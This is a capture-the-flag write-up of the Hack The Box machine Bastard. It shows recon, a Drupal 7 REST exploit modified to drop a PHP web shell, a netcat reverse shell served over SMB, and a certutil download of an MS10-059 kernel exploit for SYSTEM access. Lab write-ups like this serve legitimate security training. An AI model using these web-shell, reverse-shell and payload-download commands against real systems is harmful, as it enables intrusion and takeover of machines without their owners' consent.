# Bastard 

**OS:** Windows

**Level:** Medium

**Links:** [1](https://www.hackthebox.com/machines/Bastard)  [2](https://app.hackthebox.com/machines/Bastard)

**Machine ip:** 10.10.10.9

![Bastard](https://github.com/h4md153v63n/CTFs/assets/5091265/84d54684-632c-4ac5-ac8e-146a4b2d7267)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.9 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.9 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3af46416-e08d-4b5c-bdfb-0d8a16c4e1fb)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c9205d7a-b825-43c2-b71b-15b0456a3bb3)


## Enumeration
Visit **http://10.10.10.9**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cf5880f4-a25e-4c05-9b77-86ee83268cc1)

Check **http://10.10.10.9/CHANGELOG.txt**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5163edd8-e04c-472a-bd4e-45e64c7c4083)

Run searchsploit:

```
searchsploit drupal 7.x

searchsploit -m 41564
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d11fa67b-28a5-4a61-a50f-57a97b5b080c)

```
gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.9/ -k -n -r -t 10 --exclude-length 1233
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ccab42b-9061-43f5-9c20-7b7c06453c46)

Test **http://10.10.10.9/rest** on the browser or using **curl**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/575bf492-5f0d-4771-b1b2-9a4d444580b6)

Modify the below lines in the exploit code:

```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'cmd.php',
    'data' => '<?php system($_GET["cmd"]); ?>'
];
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b01489e0-aa1c-4305-ae2f-d9ae3dbd4b2b)

Run the exploit: `php 41564.php`

In case of **PHP Fatal error:  Uncaught Error: Call to undefined function curl_init()** error, run `sudo apt install php-curl` to install **php-curl**:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/293cb05e-6870-46cc-812d-1185ac050fa2)

Rerun the exploit: `php 41564.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab1d4ce6-aee4-4848-ba58-e3312d37e1c2)

It creates 2 files: **session.json** and **user.json**. 

Execute **http://10.10.10.9/cmd.php?cmd=whoami%20/all**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/557645c5-3039-4d4c-ab37-c4e5a0a724b8)


## Exploitation & Gaining Access
```
# On the kali attack vm: Start smbserver to share a copy of nc.exe
smbserver.py win /usr/share/windows-binaries/

# On the kali attack vm: Start netcat listener
nc -lnvp 4444

# Trigger the netcat revershell on the browser:
http://10.10.10.9/cmd.php?cmd=\\10.10.14.24\win\nc.exe -e cmd.exe 10.10.14.24 4444
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dcb8eaec-0ef3-4de7-b6ac-29859f8eecd4)

Get the revershell, and read user flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/652b50a0-4934-4ecd-8c70-20636bc5ac0d)


## Privilege Escalation
Run `systeminfo` command:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c0ed2707-e0cb-481d-b467-a6d5aaaf90df)

Run Windows Exploit Suggester:

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-14-mssb.xls --systeminfo systeminfo.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1c85b903-336c-44b0-8e07-07b9f66c9861)

There are many exploits for privilege escalation here, but for now try **MS10–059**.

Download [exploit](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe), and transfer to the target victim, then prepare netcat listener, and run the **MS10–059.exe**:

```
# On the kali attack vm:
sudo python3 -m http.server 80

nc -lnvp 5555

# On the target machine:
certutil.exe -urlcache -split -f "http://10.10.14.24/MS10-059.exe" MS10-059.exe

MS10-059.exe 10.10.14.24 5555
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7d279287-cbd6-42b2-8a42-fa6be81d17b6)


# References & Alternatives
+ https://vvmlist.github.io/#Bastard
+ 


## CVE Scripting
+ **MS10–059?**
    + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe 


## Tools
+  


## Technical Knowledge
+  


## Problems Solution
+ **PHP Fatal error:  Uncaught Error: Call to undefined function curl_init():** 
  + https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init
  + https://enginetemplates.com/call-to-undefined-function-curl_init/


## For More
+ 
